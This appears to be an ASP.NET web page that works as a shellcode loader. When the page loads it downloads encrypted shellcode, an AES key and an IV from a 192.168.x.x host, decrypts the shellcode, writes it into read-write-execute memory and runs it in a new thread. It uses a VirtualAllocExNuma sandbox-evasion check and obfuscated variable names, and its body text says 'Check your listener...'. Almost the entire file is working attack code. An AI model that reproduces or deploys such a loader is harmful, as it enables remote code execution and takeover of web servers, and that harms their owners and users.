<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Linq" %>

<script runat="server">

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[   System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    private byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
    {
        using (var aes = Aes.Create())
        {
            aes.KeySize = 256;
            aes.BlockSize = 128;

            // Keep this in mind when you view your decrypted content as the size will likely be different.
            aes.Padding = PaddingMode.Zeros;

            aes.Key = key;
            aes.IV = iv;

            using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
            {
                return PerformCryptography(data, decryptor);
            }
        }
    }

    private byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
    {
        using (var ms = new MemoryStream())
        using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
        {
            cryptoStream.Write(data, 0, data.Length);
            cryptoStream.FlushFinalBlock();
            return ms.ToArray();
        }
    }

    private byte[] GetArray(string url)
    {
        using (WebClient webClient = new WebClient())
        {
            string content = webClient.DownloadString(url);
            byte[] byteArray = content.Split(',')
            .Select(hexValue => Convert.ToByte(hexValue.Trim(), 16))
            .ToArray();
            return byteArray;
        }
    }

    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if(mem == null)
        {
            return;
        }

        // Encrypted shellcode
        byte[] Enc = GetArray("http://192.168.x.x/enc.txt");

        // Key
        byte[] Key = GetArray("http://192.168.x.x/key.txt");

        // IV
        byte[] Iv = GetArray("http://192.168.x.x/iv.txt");

        // Decrypt our shellcode
        byte[] e4qRS= Decrypt(Enc, Key, Iv);

        // Allocate our memory buffer
        IntPtr zG5fzCKEhae = VirtualAlloc(IntPtr.Zero,(UIntPtr)e4qRS.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        
        // Copy our decrypted shellcode ito the buffer
        System.Runtime.InteropServices.Marshal.Copy(e4qRS,0,zG5fzCKEhae,e4qRS.Length);
        IntPtr aj5QpPE = IntPtr.Zero;

        // Create a thread that contains our buffer
        IntPtr oiAJp5aJjiZV = CreateThread(IntPtr.Zero,UIntPtr.Zero,zG5fzCKEhae,IntPtr.Zero,0,ref aj5QpPE);
    }
</script>
<!DOCTYPE html>
<html>
<body>
    <p>Check your listener...</p>
</body>
</html>
